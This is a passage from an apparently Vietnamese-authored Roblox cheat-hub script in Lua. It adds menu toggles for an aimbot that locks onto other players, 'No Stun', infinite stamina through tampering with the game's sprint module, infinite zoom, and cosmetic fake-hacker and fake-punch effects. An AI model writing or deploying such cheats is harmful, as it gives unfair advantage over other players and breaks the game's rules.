4968 | Tabs.Custom:AddToggle("UnlockSukunaSkill", {
4969 |     Title = "Unlock Sukuna Skill",
4970 |     Default = false
4971 | }):OnChanged(function(state)
4972 |     screenGui.Enabled = state
4973 | end)
4974 | 
4975 | Tabs.Custom:AddToggle("LockFrames", {
4976 |     Title = "Lock Buttons",
4977 |     Default = true
4978 | }):OnChanged(function(state)
4979 |     FramesLocked = state
4980 |     for _, frame in ipairs(createdFrames) do
4981 |         local btn = frame:FindFirstChildOfClass("ImageButton")
4982 |         if btn then
4983 |             btn.Visible = FramesLocked
4984 |         end
4985 |         frame.BackgroundTransparency = FramesLocked and 1 or 0.3
4986 |     end
4987 | end)
4988 | 
4989 | Tabs.Custom:AddInput("ButtonSizeInput", {
4990 |     Title = "Button Size",
4991 |     Default = tostring(BUTTON_SIZE),
4992 |     Placeholder = "Nh·∫≠p s·ªë px",
4993 |     Numeric = true,
4994 |     Finished = true
4995 | }):OnChanged(function(value)
4996 |     local num = tonumber(value)
4997 |     if num and num > 0 then
4998 |         BUTTON_SIZE = num
4999 |         for _, frame in ipairs(createdFrames) do
5000 |             frame.Size = UDim2.new(0, BUTTON_SIZE, 0, BUTTON_SIZE)
5001 |             local btn = frame:FindFirstChildOfClass("ImageButton")
5002 |             if btn then
5003 |                 btn.Size = UDim2.new(1, 0, 1, 0)
5004 |             end
5005 |         end
5006 |     end
5007 | end)
5008 | end
5009 | 
5010 | 
5011 | 
5012 | 
5013 | 
5014 | 
5015 | 
5016 | -- üß† Services
5017 | getgenv().SoundService = game:GetService("SoundService")
5018 | getgenv().RunService = game:GetService("RunService")
5019 | 
5020 | -- üìÅ Ensure folders exist
5021 | local folderPath = "LagCatHub/Assets"
5022 | if not isfolder("LagCatHub") then makefolder("LatCatHub") end
5023 | if not isfolder(folderPath) then makefolder(folderPath) end
5024 | 
5025 | 
5026 | 
5027 | Tabs.Custom:AddSection("Victim")
5028 | 
5029 | -- HackerVibe_Toggle.lua
5030 | -- Hi·ªáu ·ª©ng hacker th·∫≠t 3D, c√≥ n√∫t b·∫≠t/t·∫Øt (Fake H4CK3R)
5031 | -- B·∫£o to√†n sau khi ch·∫øt, ƒë·ªïi character, kh√¥ng rung gi·∫≠t
5032 | -- Hi·ªáu ·ª©ng hacker 3D + animation t·ª± b·∫≠t/t·∫Øt
5033 | 
5034 | local Players = game:GetService("Players")
5035 | local TweenService = game:GetService("TweenService")
5036 | local player = Players.LocalPlayer
5037 | local character = player.Character or player.CharacterAdded:Wait()
5038 | 
5039 | -- ‚öôÔ∏è CONFIG
5040 | local outlineColor = Color3.fromRGB(0, 255, 255)
5041 | local binarySpawnInterval = 0.12
5042 | local binaryLifetime = 1.8
5043 | local binaryRiseDistance = 5
5044 | local binaryMinScale = 0.6
5045 | local binaryMaxScale = 1.1
5046 | local maxSimultaneous = 40
5047 | local spawnRadius = 3
5048 | local animationId = "rbxassetid://86559211184601" -- üß† Animation Hacker
5049 | 
5050 | math.randomseed(tick() + player.UserId)
5051 | 
5052 | -- === Bi·∫øn ===
5053 | local active = 0
5054 | local running = false
5055 | local folderName = "HackerFX3D"
5056 | local folder = nil
5057 | local animTrack = nil
5058 | 
5059 | -- === Danh s√°ch part ƒë·ªÉ spawn ch·ªØ ===
5060 | local partNames = {
5061 | 	"Head","HumanoidRootPart",
5062 | 	"UpperTorso","LowerTorso","Torso",
5063 | 	"LeftUpperArm","RightUpperArm","LeftLowerArm","RightLowerArm",
5064 | 	"LeftUpperLeg","RightUpperLeg","LeftLowerLeg","RightLowerLeg",
5065 | 	"LeftHand","RightHand","LeftFoot","RightFoot"
5066 | }
5067 | 
5068 | local function getParts()
5069 | 	character = player.Character or player.CharacterAdded:Wait()
5070 | 	local list = {}
5071 | 	for _, name in ipairs(partNames) do
5072 | 		local part = character:FindFirstChild(name)
5073 | 		if part and part:IsA("BasePart") then
5074 | 			table.insert(list, part)
5075 | 		end
5076 | 	end
5077 | 	return list
5078 | end
5079 | 
5080 | -- === Highlight Hacker ===
5081 | local function createHighlight()
5082 | 	local old = character:FindFirstChild("HackerHighlight")
5083 | 	if old then old:Destroy() end
5084 | 	local h = Instance.new("Highlight")
5085 | 	h.Name = "HackerHighlight"
5086 | 	h.Adornee = character
5087 | 	h.OutlineColor = outlineColor
5088 | 	h.FillTransparency = 1
5089 | 	h.OutlineTransparency = 0
5090 | 	h.Parent = character
5091 | end
5092 | 
5093 | -- === Folder hi·ªáu ·ª©ng ===
5094 | local function ensureFolder()
5095 | 	folder = player:WaitForChild("PlayerGui"):FindFirstChild(folderName)
5096 | 	if not folder then
5097 | 		folder = Instance.new("Folder")
5098 | 		folder.Name = folderName
5099 | 		folder.Parent = player:WaitForChild("PlayerGui")
5100 | 	end
5101 | 	return folder
5102 | end
5103 | 
5104 | -- === Hi·ªáu ·ª©ng s·ªë bay ===
5105 | local function spawnBinary()
5106 | 	if not running then return end
5107 | 	if active >= maxSimultaneous then return end
5108 | 
5109 | 	local parts = getParts()
5110 | 	if #parts == 0 then return end
5111 | 	local origin = parts[math.random(1, #parts)]
5112 | 	if not origin then return end
5113 | 
5114 | 	active += 1
5115 | 	local s = ""
5116 | 	for i = 1, math.random(1, 3) do
5117 | 		s ..= tostring(math.random(0, 1))
5118 | 	end
5119 | 
5120 | 	local attach = Instance.new("Part")
5121 | 	attach.Anchored = false
5122 | 	attach.CanCollide = false
5123 | 	attach.Transparency = 1
5124 | 	attach.Size = Vector3.new(0.2, 0.2, 0.2)
5125 | 	attach.Parent = ensureFolder()
5126 | 
5127 | 	local weld = Instance.new("WeldConstraint")
5128 | 	weld.Part0 = attach
5129 | 	weld.Part1 = origin
5130 | 	weld.Parent = attach
5131 | 
5132 | 	local xOff = (math.random() - 0.5) * spawnRadius
5133 | 	local yOff = (math.random() - 0.5) * spawnRadius
5134 | 	local zOff = (math.random() - 0.5) * spawnRadius
5135 | 	attach.CFrame = origin.CFrame * CFrame.new(xOff, yOff, zOff)
5136 | 
5137 | 	local bb = Instance.new("BillboardGui")
5138 | 	bb.Size = UDim2.new(0, 80, 0, 30)
5139 | 	bb.AlwaysOnTop = true
5140 | 	bb.Adornee = attach
5141 | 	bb.Parent = folder
5142 | 
5143 | 	local txt = Instance.new("TextLabel")
5144 | 	txt.BackgroundTransparency = 1
5145 | 	txt.BorderSizePixel = 0
5146 | 	txt.Size = UDim2.fromScale(1, 1)
5147 | 	txt.Font = Enum.Font.Code
5148 | 	txt.Text = s
5149 | 	txt.TextColor3 = Color3.fromRGB(0, 255, 200)
5150 | 	txt.TextScaled = true
5151 | 	txt.TextTransparency = 0
5152 | 	txt.Parent = bb
5153 | 	txt.TextSize = 20 * (math.random() * (binaryMaxScale - binaryMinScale) + binaryMinScale)
5154 | 
5155 | 	local goal = attach.Position + Vector3.new(0, binaryRiseDistance, 0)
5156 | 	local moveTween = TweenService:Create(attach, TweenInfo.new(binaryLifetime, Enum.EasingStyle.Linear), {Position = goal})
5157 | 	local fadeTween = TweenService:Create(txt, TweenInfo.new(binaryLifetime, Enum.EasingStyle.Linear), {TextTransparency = 1})
5158 | 	moveTween:Play()
5159 | 	fadeTween:Play()
5160 | 
5161 | 	task.delay(binaryLifetime + 0.05, function()
5162 | 		pcall(function()
5163 | 			bb:Destroy()
5164 | 			attach:Destroy()
5165 | 		end)
5166 | 		active = math.max(0, active - 1)
5167 | 	end)
5168 | end
5169 | 
5170 | -- === Loop spawn ch·ªØ ===
5171 | task.spawn(function()
5172 | 	while true do
5173 | 		if running then
5174 | 			spawnBinary()
5175 | 		end
5176 | 		task.wait(binarySpawnInterval)
5177 | 	end
5178 | end)
5179 | 
5180 | -- === Khi respawn / ƒë·ªïi nh√¢n v·∫≠t ===
5181 | player.CharacterAdded:Connect(function(char)
5182 | 	character = char
5183 | 	task.wait(0.25)
5184 | 	if running then
5185 | 		createHighlight()
5186 | 
5187 | 		-- üîÑ Ph√°t l·∫°i animation n·∫øu ƒëang b·∫≠t
5188 | 		local hum = character:FindFirstChildOfClass("Humanoid")
5189 | 		if hum then
5190 | 			local anim = Instance.new("Animation")
5191 | 			anim.AnimationId = animationId
5192 | 			animTrack = hum:LoadAnimation(anim)
5193 | 			animTrack:Play()
5194 | 			animTrack.Looped = true
5195 | 		end
5196 | 	end
5197 | end)
5198 | 
5199 | -- === H√ÄM CH√çNH B·∫¨T / T·∫ÆT ===
5200 | local function ToggleFakeHacker(state)
5201 | 	running = state
5202 | 
5203 | 	local highlight = character:FindFirstChild("HackerHighlight")
5204 | 	if not highlight and state then
5205 | 		createHighlight()
5206 | 	end
5207 | 
5208 | 	if highlight then
5209 | 		highlight.OutlineTransparency = state and 0 or 1
5210 | 	end
5211 | 
5212 | 	if state then
5213 | 		ensureFolder().Parent = player:WaitForChild("PlayerGui")
5214 | 
5215 | 		-- üé¨ B·∫Øt ƒë·∫ßu animation
5216 | 		local hum = character:FindFirstChildOfClass("Humanoid")
5217 | 		if hum then
5218 | 			local anim = Instance.new("Animation")
5219 | 			anim.AnimationId = animationId
5220 | 			animTrack = hum:LoadAnimation(anim)
5221 | 			animTrack.Looped = true
5222 | 			animTrack:Play()
5223 | 		end
5224 | 	else
5225 | 		-- üõë D·ª´ng animation
5226 | 		if animTrack then
5227 | 			animTrack:Stop()
5228 | 			animTrack:Destroy()
5229 | 			animTrack = nil
5230 | 		end
5231 | 
5232 | 		-- üßπ X√≥a hi·ªáu ·ª©ng ch·ªØ
5233 | 		local f = player.PlayerGui:FindFirstChild(folderName)
5234 | 		if f then
5235 | 			for _, v in ipairs(f:GetChildren()) do
5236 | 				v:Destroy()
5237 | 			end
5238 | 		end
5239 | 	end
5240 | end
5241 | 
5242 | -- === G·∫ÆN V√ÄO UI (v√≠ d·ª• Fluent) ===
5243 | Tabs.Custom:AddToggle("FakeH4CK3R", {
5244 | 	Title = "Fake H4CK3R",
5245 | 	Default = false,
5246 | 	Callback = function(Value)
5247 | 		ToggleFakeHacker(Value)
5248 | 	end
5249 | })
5250 | 
5251 | 
5252 | -- Tabs.Player
5253 | 
5254 | 
5255 | 
5256 | -- ======= D·ªäCH V·ª§ =======
5257 | local Players = game:GetService("Players")
5258 | local RunService = game:GetService("RunService")
5259 | local LocalPlayer = Players.LocalPlayer
5260 | 
5261 | -- ======= WHITELIST =======
5262 | local AllowedPlayers = {
5263 |     ["Noob"] = true, ["Guest1337"] = true, ["Elliot"] = true,
5264 |     ["Shedletsky"] = true, ["TwoTime"] = true, ["007n7"] = true,
5265 |     ["Chance"] = true, ["Builderman"] = true, ["Taph"] = true,
5266 |     ["Dusekkar"] = true, ["Veeronica"] = true,
5267 | }
5268 | 
5269 | local AllowedKillers = {
5270 |     ["Slasher"] = true, ["1x1x1x1"] = true, ["c00lkidd"] = true,
5271 |     ["Noli"] = true, ["JohnDoe"] = true, ["Guest 666"] = true,
5272 |     ["Sixer"] = true,
5273 | }
5274 | 
5275 | -- ======= BI·∫æN TR·∫†NG TH√ÅI =======
5276 | local AimlockPlayerEnabled = false
5277 | local AimlockKillerEnabled = false
5278 | local CurrentTarget = nil
5279 | local lastHumanoidAutoRotate = nil
5280 | 
5281 | -- ======= H√ÄM H·ªñ TR·ª¢ =======
5282 | local function IsAllowed(model, list)
5283 |     return list[model.Name] == true
5284 | end
5285 | 
5286 | local function GetModelFromPlayer(plr, list)
5287 |     if not plr.Character then return nil end
5288 |     if IsAllowed(plr.Character, list) and plr.Character:FindFirstChildWhichIsA("Humanoid") then
5289 |         return plr.Character
5290 |     end
5291 |     for _, model in ipairs(workspace:GetChildren()) do
5292 |         if model:IsA("Model") and model:FindFirstChildWhichIsA("Humanoid") then
5293 |             if model:FindFirstChild("Owner") and model.Owner.Value == plr then
5294 |                 if IsAllowed(model, list) then
5295 |                     return model
5296 |                 end
5297 |             end
5298 |         end
5299 |     end
5300 |     return nil
5301 | end
5302 | 
5303 | local function GetClosestTarget(list)
5304 |     local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
5305 |     if not myRoot then return nil end
5306 |     local closest, dist = nil, math.huge
5307 | 
5308 |     for _, plr in ipairs(Players:GetPlayers()) do
5309 |         if plr ~= LocalPlayer then
5310 |             local model = GetModelFromPlayer(plr, list)
5311 |             if model and model.PrimaryPart then
5312 |                 local humanoid = model:FindFirstChildWhichIsA("Humanoid")
5313 |                 if humanoid and humanoid.Health > 0 then
5314 |                     local distance = (model.PrimaryPart.Position - myRoot.Position).Magnitude
5315 |                     if distance < dist then
5316 |                         dist = distance
5317 |                         closest = model
5318 |                     end
5319 |                 end
5320 |             end
5321 |         end
5322 |     end
5323 |     return closest
5324 | end
5325 | 
5326 | local function ValidateTarget(target)
5327 |     if not target then return false end
5328 |     local humanoid = target:FindFirstChildWhichIsA("Humanoid")
5329 |     return humanoid and humanoid.Health > 0 and target.PrimaryPart ~= nil
5330 | end
5331 | 
5332 | -- reset khi respawn
5333 | LocalPlayer.CharacterAdded:Connect(function(char)
5334 |     CurrentTarget = nil
5335 |     if lastHumanoidAutoRotate ~= nil then
5336 |         local hum = char:FindFirstChildWhichIsA("Humanoid")
5337 |         if hum then
5338 |             hum.AutoRotate = lastHumanoidAutoRotate
5339 |         end
5340 |         lastHumanoidAutoRotate = nil
5341 |     end
5342 | end)
5343 | 
5344 | -- ======= AIMBOT LOOP (fix: h∆∞·ªõng ƒë√∫ng, kh√¥ng b·ªã ƒëen m√†n h√¨nh) =======
5345 | RunService.RenderStepped:Connect(function()
5346 |     local myChar = LocalPlayer.Character
5347 |     local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
5348 |     local humanoid = myChar and myChar:FindFirstChildWhichIsA("Humanoid")
5349 | 
5350 |     if not myRoot then return end
5351 | 
5352 |     -- toggle AutoRotate
5353 |     if (AimlockPlayerEnabled or AimlockKillerEnabled) and humanoid then
5354 |         if lastHumanoidAutoRotate == nil then
5355 |             lastHumanoidAutoRotate = humanoid.AutoRotate
5356 |         end
5357 |         humanoid.AutoRotate = false
5358 |     elseif humanoid and lastHumanoidAutoRotate ~= nil then
5359 |         humanoid.AutoRotate = lastHumanoidAutoRotate
5360 |         lastHumanoidAutoRotate = nil
5361 |     end
5362 | 
5363 |     -- h√†m xoay nh√¨n target (fix: d√πng lookVector:Cross(up) ƒë·ªÉ rightVector ƒë√∫ng)
5364 |     local function faceTarget(target)
5365 |         if not target or not target.PrimaryPart then return end
5366 |         local pos = myRoot.Position
5367 |         local targetPos = target.PrimaryPart.Position
5368 |         local dir = Vector3.new(targetPos.X, pos.Y, targetPos.Z) - pos
5369 |         if dir.Magnitude == 0 then return end
5370 | 
5371 |         local lookVector = dir.Unit
5372 |         local up = Vector3.yAxis
5373 |         local rightVector = lookVector:Cross(up) -- CH·ªàNH: right = look x up (kh√¥ng ng∆∞·ª£c)
5374 |         if rightVector.Magnitude == 0 then
5375 |             rightVector = Vector3.new(1, 0, 0)
5376 |         else
5377 |             rightVector = rightVector.Unit
5378 |         end
5379 | 
5380 |         -- fromMatrix(position, rightVector, up) ‚Äî ch·ªâ thay orientation, gi·ªØ nguy√™n v·ªã tr√≠
5381 |         myRoot.CFrame = CFrame.fromMatrix(pos, rightVector, up)
5382 |     end
5383 | 
5384 |     if AimlockPlayerEnabled then
5385 |         if not ValidateTarget(CurrentTarget) then
5386 |             CurrentTarget = GetClosestTarget(AllowedPlayers)
5387 |         end
5388 |         if ValidateTarget(CurrentTarget) then
5389 |             faceTarget(CurrentTarget)
5390 |         end
5391 |     elseif AimlockKillerEnabled then
5392 |         if not ValidateTarget(CurrentTarget) then
5393 |             CurrentTarget = GetClosestTarget(AllowedKillers)
5394 |         end
5395 |         if ValidateTarget(CurrentTarget) then
5396 |             faceTarget(CurrentTarget)
5397 |         end
5398 |     else
5399 |         CurrentTarget = nil
5400 |     end
5401 | end)
5402 | 
5403 | -- ======= FLUENT TOGGLES =======
5404 | Tabs.Player:AddToggle("ForsakenAimbot", {
5405 |     Title = "Aimbot Player",
5406 |     Default = false
5407 | }):OnChanged(function(v)
5408 |     AimlockPlayerEnabled = v
5409 |     if v then 
5410 |         AimlockKillerEnabled = false
5411 |         CurrentTarget = nil
5412 |     end
5413 | end)
5414 | 
5415 | Tabs.Player:AddToggle("ForsakenAimbot1", {
5416 |     Title = "Aimbot Killer",
5417 |     Default = false
5418 | }):OnChanged(function(v)
5419 |     AimlockKillerEnabled = v
5420 |     if v then 
5421 |         AimlockPlayerEnabled = false
5422 |         CurrentTarget = nil
5423 |     end
5424 | end)
5425 | 
5426 | 
5427 | 
5428 | 
5429 | 
5430 | 
5431 |     Tabs.Player:AddSection("Cheats")
5432 | 
5433 | local ActiveNoStun = false
5434 | local noStunLoop
5435 | 
5436 | Tabs.Player:AddToggle("NoStunToggle", {
5437 |     Title = "No Stun",
5438 |     Default = false,
5439 | }):OnChanged(function(value)
5440 |     ActiveNoStun = value
5441 | 
5442 |     if value then
5443 |         -- N·∫øu c√≥ loop c≈© th√¨ d·ª´ng
5444 |         if noStunLoop then
5445 |             task.cancel(noStunLoop)
5446 |             noStunLoop = nil
5447 |         end
5448 | 
5449 |         -- T·∫°o loop m·ªõi li√™n t·ª•c ƒë·∫£m b·∫£o HumanoidRootPart kh√¥ng b·ªã anchore
5450 |         noStunLoop = task.spawn(function()
5451 |             while ActiveNoStun do
5452 |                 local character = game.Players.LocalPlayer.Character
5453 |                 local hrp = character and character:FindFirstChild("HumanoidRootPart")
5454 |                 if hrp then
5455 |                     hrp.Anchored = false
5456 |                 end
5457 |                 task.wait(0.1) -- Kh√¥ng c·∫ßn qu√° nhanh, tr√°nh lag
5458 |             end
5459 |         end)
5460 |     else
5461 |         -- T·∫Øt loop khi toggle off
5462 |         if noStunLoop then
5463 |             task.cancel(noStunLoop)
5464 |             noStunLoop = nil
5465 |         end
5466 |     end
5467 | end)
5468 | 
5469 | 
5470 | 
5471 | 
5472 | 
5473 | 
5474 | local InfStaminaEnabled = false  
5475 | local staminaLoop  
5476 | local StaminaModule  
5477 |   
5478 | -- Th·ª≠ l·∫•y module an to√†n  
5479 | pcall(function()  
5480 |     local ReplicatedStorage = game:GetService("ReplicatedStorage")  
5481 |     local path = ReplicatedStorage:FindFirstChild("Systems")  
5482 |         and ReplicatedStorage.Systems:FindFirstChild("Character")  
5483 |         and ReplicatedStorage.Systems.Character:FindFirstChild("Game")  
5484 |         and ReplicatedStorage.Systems.Character.Game:FindFirstChild("Sprinting")  
5485 |   
5486 |     if path then  
5487 |         StaminaModule = require(path)  
5488 |     end  
5489 | end)  
5490 |   
5491 | -- H√†m h·ªìi stamina an to√†n  
5492 | local function restoreStamina()  
5493 |     if not StaminaModule then return end  
5494 | 
5495 |     local maxStamina = StaminaModule.MaxStamina or 100  
5496 |     if StaminaModule.Stamina then  
5497 |         -- N·∫øu module c√≥ h√†m "SetStamina" th√¨ d√πng  
5498 |         if typeof(StaminaModule.SetStamina) == "function" then  
5499 |             StaminaModule:SetStamina(maxStamina)  
5500 | 
5501 |         -- N·∫øu c√≥ h√†m "UpdateStamina" th√¨ d√πng  
5502 |         elseif typeof(StaminaModule.UpdateStamina) == "function" then  
5503 |             StaminaModule:UpdateStamina(maxStamina)  
5504 | 
5505 |         -- N·∫øu kh√¥ng c√≥ th√¨ set tr·ª±c ti·∫øp  
5506 |         else  
5507 |             StaminaModule.Stamina = maxStamina  
5508 |         end  
5509 |     end  
5510 | end  
5511 |   
5512 | -- Ch·ªâ t·∫°o toggle n·∫øu module t·ªìn t·∫°i  
5513 | if StaminaModule then  
5514 |     Tabs.Player:AddToggle("InfStamina", {  
5515 |         Title = "Infinite Stamina",  
5516 |         Default = false  
5517 |     }):OnChanged(function(value)  
5518 |         -- lu√¥n b·ªçc trong pcall ƒë·ªÉ Fluent kh√¥ng b√°o "Callback error"  
5519 |         local ok = pcall(function()  
5520 |             InfStaminaEnabled = value  
5521 |             if StaminaModule.StaminaLossDisabled ~= nil then  
5522 |                 StaminaModule.StaminaLossDisabled = value  
5523 |             end  
5524 |   
5525 |             if value then  
5526 |                 restoreStamina()  
5527 |                 if not staminaLoop then  
5528 |                     staminaLoop = task.spawn(function()  
5529 |                         while InfStaminaEnabled do  
5530 |                             task.wait(0.01)  
5531 |                             restoreStamina()  
5532 |                         end  
5533 |                         staminaLoop = nil  
5534 |                     end)  
5535 |                 end  
5536 |             end  
5537 |         end)  
5538 |     end)  
5539 | else  
5540 |     warn("[InfStamina] Sprinting module not found, toggle disabled.")  
5541 | end
5542 | 
5543 | 
5544 | 
5545 | 
5546 | Tabs.Player:AddToggle("InfiniteZoom", {
5547 |     Title = "Infinite Zoom",
5548 |     Default = false,
5549 |     Callback = function(Value)
5550 |         local player = game.Players.LocalPlayer
5551 |         local camera = workspace.CurrentCamera
5552 | 
5553 |         if Value then
5554 |             -- B·∫≠t zoom v√¥ h·∫°n
5555 |             player.CameraMaxZoomDistance = math.huge
5556 |             player.CameraMinZoomDistance = 0.5
5557 |             print("[ZoomCam] Infinite Zoom Enabled ‚úÖ")
5558 |         else
5559 |             -- T·∫Øt zoom v√¥ h·∫°n, tr·ªü l·∫°i b√¨nh th∆∞·ªùng
5560 |             player.CameraMaxZoomDistance = 128
5561 |             player.CameraMinZoomDistance = 0.5
5562 |             print("[ZoomCam] Infinite Zoom Disabled ‚ùå")
5563 |         end
5564 |     end
5565 | })
5566 | 
5567 | 
5568 | 
5569 |     Tabs.Player:AddSection("Troller")
5570 | 
5571 | 
5572 | 
5573 | 
5574 | Tabs.Player:AddButton({
5575 |     Title = "Fake Block",
5576 |     Callback = function()
5577 |         -- T·∫°o Animation object
5578 |         local animation = Instance.new("Animation")
5579 |         animation.AnimationId = "rbxassetid://72722244508749"
5580 | 
5581 |         -- L·∫•y Humanoid c·ªßa nh√¢n v·∫≠t
5582 |         local player = game.Players.LocalPlayer
5583 |         local character = player.Character or player.CharacterAdded:Wait()
5584 |         local humanoid = character:FindFirstChildOfClass("Humanoid")
5585 | 
5586 |         if humanoid then
5587 |             local animator = humanoid:FindFirstChildOfClass("Animator")
5588 |             if not animator then
5589 |                 animator = Instance.new("Animator")
5590 |                 animator.Parent = humanoid
5591 |             end
5592 | 
5593 |             -- Load v√† Play animation
5594 |             local animTrack = animator:LoadAnimation(animation)
5595 |             animTrack:Play()
5596 |         end
5597 |     end
5598 | })
5599 | 
5600 | 
5601 | 
5602 | Tabs.Player:AddButton({
5603 |     Title = "Fake Punch",
5604 |     Callback = function()
5605 |         -- T·∫°o Animation object
5606 |         local animation = Instance.new("Animation")
5607 |         animation.AnimationId = "rbxassetid://87259391926321"
5608 | 
5609 |         -- L·∫•y Humanoid c·ªßa nh√¢n v·∫≠t
5610 |         local player = game.Players.LocalPlayer
5611 |         local character = player.Character or player.CharacterAdded:Wait()
5612 |         local humanoid = character:FindFirstChildOfClass("Humanoid")
5613 | 
5614 |         if humanoid then
5615 |             local animator = humanoid:FindFirstChildOfClass("Animator")
5616 |             if not animator then
5617 |                 animator = Instance.new("Animator")
5618 |                 animator.Parent = humanoid
5619 |             end
5620 | 
5621 |             -- Load v√† Play animation
5622 |             local animTrack = animator:LoadAnimation(animation)
5623 |             animTrack:Play()
5624 |         end
5625 | 
5626 |         -- √Çm thanh ƒë·∫ßu ti√™n
5627 |         local sound1 = Instance.new("Sound")
5628 |         sound1.SoundId = "rbxassetid://81976396729343"
5629 |         sound1.Parent = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
5630 |         sound1:Play()
5631 | 
5632 |         -- Sau 0.75 gi√¢y th√¨ t·∫Øt sound1 v√† ph√°t sound2
5633 |         task.delay(0.75, function()
5634 |             if sound1.IsPlaying then
5635 |                 sound1:Stop()
5636 |             end
5637 |             local sound2 = Instance.new("Sound")
5638 |             sound2.SoundId = "rbxassetid://122560631718612"
5639 |             sound2.Parent = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
5640 |             sound2:Play()
5641 |         end)
5642 |     end
5643 | })
5644 | 
5645 | 
5646 | 
5647 | 
5648 | Tabs.Player:AddButton({
5649 |     Title = "Fake Punch v2",
5650 |     Callback = function()
5651 |         -- T·∫°o Animation object
5652 |         local animation = Instance.new("Animation")
5653 |         animation.AnimationId = "rbxassetid://86709774283672"
5654 | 
5655 |         -- L·∫•y Humanoid c·ªßa nh√¢n v·∫≠t
5656 |         local player = game.Players.LocalPlayer
5657 |         local character = player.Character or player.CharacterAdded:Wait()
5658 |         local humanoid = character:FindFirstChildOfClass("Humanoid")
5659 | 
5660 |         if humanoid then
5661 |             local animator = humanoid:FindFirstChildOfClass("Animator")
5662 |             if not animator then
5663 |                 animator = Instance.new("Animator")
5664 |                 animator.Parent = humanoid
5665 |             end
5666 | 
5667 |             -- Load v√† Play animation
5668 |             local animTrack = animator:LoadAnimation(animation)
5669 |             animTrack:Play()
5670 |         end
5671 | 
5672 |         -- √Çm thanh ƒë·∫ßu ti√™n
5673 |         local sound1 = Instance.new("Sound")
5674 |         sound1.SoundId = "rbxassetid://81976396729343"
5675 |         sound1.Parent = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
5676 |         sound1:Play()
5677 | 
5678 |         -- Sau 0.5 gi√¢y th√¨ t·∫Øt sound1 v√† ph√°t sound2
5679 |         task.delay(0.5, function()
5680 |             if sound1.IsPlaying then
5681 |                 sound1:Stop()
5682 |             end
5683 |             local sound2 = Instance.new("Sound")
5684 |             sound2.SoundId = "rbxassetid://122560631718612"
5685 |             sound2.Parent = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
5686 |             sound2:Play()
5687 |         end)
5688 |     end
5689 | })
5690 | 
5691 | 
5692 | 
5693 | do
5694 | -- L∆∞u callback Backflip ƒë·ªÉ toggle g·ªçi l·∫°i
5695 | local function doBackflip()
5696 |     local plr = game.Players.LocalPlayer
5697 |     local char = plr and plr.Character
5698 |     if not char then return end
5699 | 
5700 |     local hum = char:FindFirstChild("Humanoid")
5701 |     local hrp = char:FindFirstChild("HumanoidRootPart")
5702 |     local animator = hum and hum:FindFirstChildOfClass("Animator")
5703 |     if not (hum and hrp) then return end
5704 | 
5705 |     if char:FindFirstChild("Animate") then
5706 |         char.Animate.Disabled = true
5707 |     end
5708 | 
5709 |     if animator then
5710 |         for _, v in ipairs(animator:GetPlayingAnimationTracks()) do
5711 |             v:Stop()
5712 |         end
5713 |     end
5714 | 
5715 |     for _, s in ipairs({
5716 |         Enum.HumanoidStateType.FallingDown,
5717 |         Enum.HumanoidStateType.Freefall,
5718 |         Enum.HumanoidStateType.Running,
5719 |         Enum.HumanoidStateType.Seated,
5720 |         Enum.HumanoidStateType.Climbing
5721 |     }) do
5722 |         hum:SetStateEnabled(s, false)
5723 |     end
5724 |     hum:ChangeState(Enum.HumanoidStateType.Physics)
5725 | 
5726 |     local d, s = 0.45, 120
5727 |     local cf = hrp.CFrame
5728 |     local dir = cf.LookVector -- ‚úÖ bay theo h∆∞·ªõng nh√¨n
5729 |     local up = Vector3.yAxis
5730 | 
5731 |     task.spawn(function()
5732 |         local t0 = tick()
5733 |         for i = 1, s do
5734 |             local t = i / s
5735 |             local y = 4 * (t - t ^ 2) * 10
5736 |             local targetPos = cf.Position + dir * (35 * t) + up * y
5737 |             local r = CFrame.Angles(math.rad(360 * t), 0, 0)
5738 | 
5739 |             -- ‚úÖ Raycast check tr∆∞·ªõc khi PivotTo
5740 |             local rayParams = RaycastParams.new()
5741 |             rayParams.FilterDescendantsInstances = {char}
5742 |             rayParams.FilterType = Enum.RaycastFilterType.Blacklist
5743 | 
5744 |             local result = workspace:Raycast(hrp.Position, (targetPos - hrp.Position), rayParams)
5745 | 
5746 |             if result then
5747 |                 -- N·∫øu c√≥ t∆∞·ªùng ch·∫∑n ‚Üí d·ª´ng t·∫°i v·ªã tr√≠ va ch·∫°m
5748 |                 targetPos = result.Position + result.Normal * 2
5749 |             end
5750 | 
5751 |             char:PivotTo(CFrame.new(targetPos) * cf.Rotation * r)
5752 | 
5753 |             local wt = (d / s) * i - (tick() - t0)
5754 |             if wt > 0 then task.wait(wt) end
5755 |         end
5756 | 
5757 |         -- Ki·ªÉm tra va ch·∫°m t·∫°i ƒëi·ªÉm k·∫øt th√∫c
5758 |         local finalTarget = cf.Position + dir * 35
5759 |         local rayParams = RaycastParams.new()
5760 |         rayParams.FilterDescendantsInstances = {char}
5761 |         rayParams.FilterType = Enum.RaycastFilterType.Blacklist
5762 |         local result = workspace:Raycast(hrp.Position, (finalTarget - hrp.Position), rayParams)
5763 |         if result then
5764 |             finalTarget = result.Position + result.Normal * 2
5765 |         end
5766 | 
5767 |         char:PivotTo(CFrame.new(finalTarget) * cf.Rotation)
5768 | 
5769 |         for _, s in ipairs({
5770 |             Enum.HumanoidStateType.FallingDown,
5771 |             Enum.HumanoidStateType.Freefall,
5772 |             Enum.HumanoidStateType.Running,
5773 |             Enum.HumanoidStateType.Seated,
5774 |             Enum.HumanoidStateType.Climbing
5775 |         }) do
5776 |             hum:SetStateEnabled(s, true)
5777 |         end
5778 |         hum:ChangeState(Enum.HumanoidStateType.Running)
5779 |         char.Animate.Disabled = false
5780 |     end)
5781 | end
5782 | 
5783 | -- N√∫t Backflip
5784 | Tabs.Player:AddButton({
5785 |     Title = "Backflip",
5786 |     -- Description = "Perform a backflip",
5787 |     Callback = doBackflip
5788 | })
5789 | 
5790 | -- Toggle Auto Backflip
5791 | local autoFlip = false
5792 | Tabs.Player:AddToggle("AutoBackflip", {
5793 |     Title = "Auto Backflip",
5794 |     Default = false,
5795 |     Callback = function(Value)
5796 |         autoFlip = Value
5797 |         if autoFlip then
5798 |             task.spawn(function()
5799 |                 while autoFlip do
5800 |                     doBackflip()
5801 |                     task.wait(1.25)
5802 |                 end
5803 |             end)
5804 |         end
5805 |     end
5806 | })
